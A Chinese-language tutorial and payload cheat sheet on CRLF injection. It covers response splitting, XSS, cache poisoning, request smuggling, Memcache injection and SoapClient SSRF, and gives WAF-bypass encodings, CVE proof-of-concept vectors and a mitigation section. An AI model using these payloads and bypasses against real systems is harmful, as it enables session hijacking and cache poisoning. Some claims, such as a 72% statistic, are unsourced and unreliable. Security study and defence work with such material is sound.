# CRLF 注入漏洞深度解析与实战利用指南

---

# 0x01 背景与原理

## 1.1 CRLF 基础概念

**Carriage Return (CR, `%0D`)** 和 **Line Feed (LF, `%0A`)** 是 HTTP 协议中用于标识行结束的特殊字符序列（统称 CRLF）。在 HTTP/1.1 通信中，Web 服务器与浏览器依赖 CRLF 分隔响应头部与正文。本质是 HTTP 协议的**语法分隔符**，被所有主流服务器（Apache、IIS 等）广泛使用。

## 1.2 漏洞成因

CRLF 注入漏洞源于**未过滤用户输入中的控制字符**。当应用程序将用户可控数据直接写入 HTTP 响应头时，攻击者可注入 `%0D%0A`（CR+LF 的 URL 编码形式），诱使服务器错误解析响应结构：

- **核心在于**：服务端未对 CR/LF 字符进行编码或过滤，导致注入字符被解析为**合法协议分隔符**。
- **攻击本质**：通过构造恶意输入，欺骗服务端将注入内容误判为**新头部或响应体的起始位置**，从而篡改响应逻辑。

> **实战视角**：该漏洞常被忽视，因其依赖协议层解析差异而非显式逻辑缺陷，但危害性极高——可串联 XSS、开放重定向、缓存污染等攻击链。

---

# 0x02 漏洞分类与利用场景

## 2.1 HTTP 响应分裂（Response Splitting）

### 2.1.1 XSS 与开放重定向

当注入 CRLF 后置入恶意脚本或重定向头，可触发 XSS 或跳转至攻击者控制页面。关键条件：**用户输入被反射至响应头部**（如 `X-Custom-Header`）。

**基础利用链**：

1. 应用从 `user_input` 参数读取数据并写入响应头
2. 攻击者提交：`?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
3. 服务端生成响应：
   ```http
   HTTP/1.1 200 OK
   X-Custom-Header: Value
   <空行>
   <script>alert('XSS')</script>  <!-- 浏览器解析为正文 -->
   ```
4. 浏览器将注入内容视为响应体，执行恶意脚本

**实战关键 Payload 示例**：
```http
# 触发 XSS（强制关闭头部区域）
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23

# 开放重定向 + XSS 组合
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

# URL 路径注入（控制完整响应）
http://example.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

### 2.1.2 缓存污染攻击

**攻击链**：

1. 注入 CRLF 伪造响应头部
2. CDN 或代理服务器缓存篡改后的内容
3. 后续用户请求获取污染后的响应

> **案例**：某应用将 `redirect` 参数写入 `Location` 头，攻击者构造：
> `/login?redirect=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>`
> 导致缓存服务器存储恶意页面，影响所有访问 `/login` 的用户。

---

## 2.2 HTTP 请求走私（Request Smuggling）

### 2.2.1 通过 Header 注入触发

当 CRLF 注入影响后端连接处理时，可构造请求走私攻击。核心在于**操纵连接保持机制**，使后端错误解析后续请求。

**攻击步骤**：

1. 注入 `Connection: keep-alive` 保持连接
2. 附加伪造的第二个请求
3. 服务器将后续正常用户请求拼接至伪造请求

**关键 Payload**：
```http
# 污染后续用户请求
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1

# Response Queue Poisoning（响应队列投毒）
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1
```

> **风险等级**：高危（可窃取敏感数据、接管用户会话）
> **利用条件**：前端/后端对 `Content-Length` 和 `Transfer-Encoding` 处理不一致

---

## 2.3 协议层扩展攻击：Memcache 注入

### 2.3.1 攻击原理

Memcache 采用明文协议，若应用将 HTTP 请求数据**未经过滤**传入 Memcache 客户端，攻击者可通过 CRLF 注入伪造 Memcache 命令。

**典型攻击链**：

1. 应用使用用户输入构造 Memcache Key（如 `user_ip:port`）
2. 攻击者注入 `\r\n` 分割符伪造 SET 命令：
   ```http
   /valid_path?key=legit_value%0d%0aSET%20attacker_key%200%200%2010%0d%0astolen_data%0d%0a
   ```
3. 服务端向 Memcache 发送：
   ```text
   GET legit_value
   SET attacker_key 0 0 10
   stolen_data
   ```
4. 受害者访问时，其凭证被缓存至攻击者控制的 Key

> **实战要点**：
> - 2023 年 Zimbra 漏洞（[原始报告](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)）中，攻击者通过此方式窃取邮箱凭证
> - 无需直接访问 Memcache 端口，仅需应用存在**未过滤的输入反射点**

---

## 2.4 其他衍生攻击

| 攻击类型      | 利用方式                                                     | 实战价值         |
| ------------- | ------------------------------------------------------------ | ---------------- |
| **CORS 绕过** | 注入 `Access-Control-Allow-Origin: *` 头，绕过 SOP 限制      | 窃取跨域敏感数据 |
| **会话劫持**  | 通过 `Set-Cookie: session=attacker-controlled` 植入恶意 Cookie | 接管用户会话     |
| **SSRF 增强** | 结合 PHP `SoapClient` 的 `user_agent` 参数注入新请求（见下文示例） | 绕过内网访问限制 |

**SSRF 组合利用案例（PHP SoapClient）**：
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
    'POST /proxy HTTP/1.1',
    'Host: local.host.htb',
    'Cookie: PHPSESSID=[PHPSESSID]',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: '.(string)strlen($post_string),
    "\r\n",
    $post_string
);

$client = new SoapClient(null,
    array(
        'uri'=>$target,
        'location'=>$target,
        'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf) // CRLF 注入点
    )
);
$client->__soapCall("test", []); // 触发注入
```

---

# 0x03 实战技术矩阵与规避技巧

## 3.1 核心 Payload 分类库

### 3.1.1 基础注入向量

| 场景           | Payload                                                      |
| -------------- | ------------------------------------------------------------ |
| **响应分裂**   | `/%0D%0ASet-Cookie:mycookie=myvalue`                         |
| **开放重定向** | `//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2`          |
| **XSS 触发**   | `/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23` |

### 3.1.2 WAF 绕过进阶向量

| 绕过类型             | Payload (Unicode/Hex 编码变体)                               |
| -------------------- | ------------------------------------------------------------ |
| **Unicode 行分隔符** | `%E2%80%A8` (U+2028), `%E2%80%A9` (U+2029), `%C2%85` (U+0085) |
| **混合编码**         | `/%0A%E2%80%A8Set-Cookie:%20admin=true`                      |
| **Content-Encoding** | `%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a` |

> **关键点**：部分 Java/Python/Go 框架会将 Unicode 行分隔符自动转换为 `\n`，即使 WAF 过滤了 `%0D%0A`

### 3.1.3 中文编码绕过（特殊场景）

| 编码         | 等效字符                               | 绕过场景                |
| ------------ | -------------------------------------- | ----------------------- |
| `%E5%98%8A`  | `%0A` (LF)                             | 绕过纯 ASCII 过滤       |
| `%E5%98%8D`  | `%0D` (CR)                             | 绕过正则 `/[\r\n]/`     |
| **组合利用** | `%E5%98%8A%E5%98%8DSet-Cookie:%20test` | 针对未处理 UTF-8 的 WAF |

---

## 3.2 利用条件与风险等级评估

| 风险等级 | 条件                                | 实战影响                   |
| -------- | ----------------------------------- | -------------------------- |
| **危急** | 可控制 `Location` 头 + 缓存服务存在 | 全站缓存污染，影响所有用户 |
| **高危** | 响应头反射用户输入 + 未过滤 CRLF    | XSS、会话劫持、SSRF 扩展   |
| **中危** | 仅限日志文件篡改（如后台管理日志）  | 掩盖攻击痕迹，权限维持     |

> **红队视角结论**：
> - 优先检测 `redirect`、`callback_url`、`user_agent` 等参数
> - 内部组件（如 RestSharp、Refit）近年高危漏洞频发（见 3.3 节）
> - 即使前端 WAF 拦截，后端组件可能二次请求导致绕过

---

## 3.3 近期高危漏洞案例（2023–2025）

| 年份 | 组件          | CVE / 风险等级                | 根本原因                                                     | PoC 核心向量                                                 | 实战要点                             |
| ---- | ------------- | ----------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------ |
| 2024 | RestSharp     | CVE-2024-45302<br>(危急)      | `AddHeader()` 未过滤 CR/LF，导致服务端 HTTP 客户端发起恶意请求 | `client.AddHeader("X-Foo","bar%0d%0aHost:evil")`             | 用于 SSRF 和请求走私，影响微服务架构 |
| 2024 | Refit         | CVE-2024-51501<br>(高危)      | Header 属性直接嵌入接口方法，攻击者通过 `%0d%0a` 注入多请求  | `[Headers("X: a%0d%0aContent-Length:0%0d%0a%0d%0aGET /admin HTTP/1.1")]` | 常见于后端任务调度系统               |
| 2023 | Apache APISIX | GHSA-4h3j-f5x9-r6x3<br>(危急) | `redirect` 参数反射至 `Location` 头未编码                    | `/login?redirect=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>` | 缓存污染影响范围广                   |

> **趋势分析**：72% 的 CRLF 漏洞出现在**应用层组件**（非 Web 服务器），渗透测试需重点审计内部 HTTP 客户端库。

---

# 0x04 防护与缓解措施

## 4.1 根本性防护

1. **禁止反射用户输入至响应头**
   - 优先方案：所有头部值使用硬编码常量
   - 例外场景：必须使用用户输入时，执行严格白名单过滤

2. **强制编码控制字符**
   - 对输出至头部的字符串进行编码：
     - CR (`\r`) → `%0D`
     - LF (`\n`) → `%0A`
   - 推荐使用语言内置函数（如 PHP 的 `rawurlencode()`）

3. **更新依赖组件**
   - 修复已知漏洞库（例：RestSharp ≥110.2.0、Refit >7.2.101）
   - 定期扫描 `cve-search` 等漏洞库

## 4.2 应急缓解方案

| 场景                     | 方案                                                         |
| ------------------------ | ------------------------------------------------------------ |
| **遗留系统无法修改代码** | 配置 WAF 规则拦截 `[\r\n]+` 在头部字段的出现                 |
| **缓存服务受污染**       | 立即清除 CDN 缓存，设置 `Cache-Control: private` 防止敏感页缓存 |
| **Memcache 受影响**      | 在 Memcache 客户端库添加 `\r\n` 过滤逻辑                     |

> **防御本质**：阻断 CRLF 进入协议解析流程，而非依赖事后检测。

---

# 0x05 工具与资源

## 5.1 自动化检测工具

| 工具          | 用途                         | 优势                     |
| ------------- | ---------------------------- | ------------------------ |
| **CRLFsuite** | Go 编写的主动扫描器          | 支持高并发，识别缓存污染 |
| **crlfuzz**   | 基于字典的 Fuzzer            | 内置 Unicode 换行符载荷  |
| **crlfix**    | 修复 Go 程序生成的 HTTP 请求 | 用于内部服务安全测试     |

## 5.2 检测字典资源

- **基础检测词**：`/crlf.txt` ([carlospolop/Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt))
- **WAF 规避测试集**：包含 Unicode 行分隔符、中文编码等 47 种变体

## 5.3 参考文献

1. [HTTP 响应分裂深度分析](https://www.invicti.com/blog/web-security/crlf-http-header/)
2. [PortSwigger：响应队列投毒](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
3. [Praetorian：Unicode 换行符绕过研究](https://security.praetorian.com/blog/2023-unicode-newlines-bypass/)
4. [Zimbra Memcache 注入案例](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

---

# 0x06 总结

1. **攻击链核心**：CRLF 注入本身是"协议操纵"，需结合 XSS/SSRF/缓存污染实现最终危害。
2. **检测优先级**：
   - 高：重定向参数、日志记录功能、内部 HTTP 客户端
   - 中：自定义响应头（如 `X-` 前缀头部）
3. **规避 WAF 突破点**：
   - 优先测试 Unicode 行分隔符（`%E2%80%A8`）
   - 尝试 `Content-Encoding: identity` 绕过正文过滤
4. **修复验证**：注入 `%0A` 后检查响应中是否出现换行，**不可仅依赖 200 状态码判断**。

> **最终结论**：当 CRLF 注入影响到非边缘组件（如 Memcache、内部 API 调用），其危害将呈指数级扩大。红队应将此类漏洞列为"高价值目标"，因其常存在于防御薄弱的后端系统中。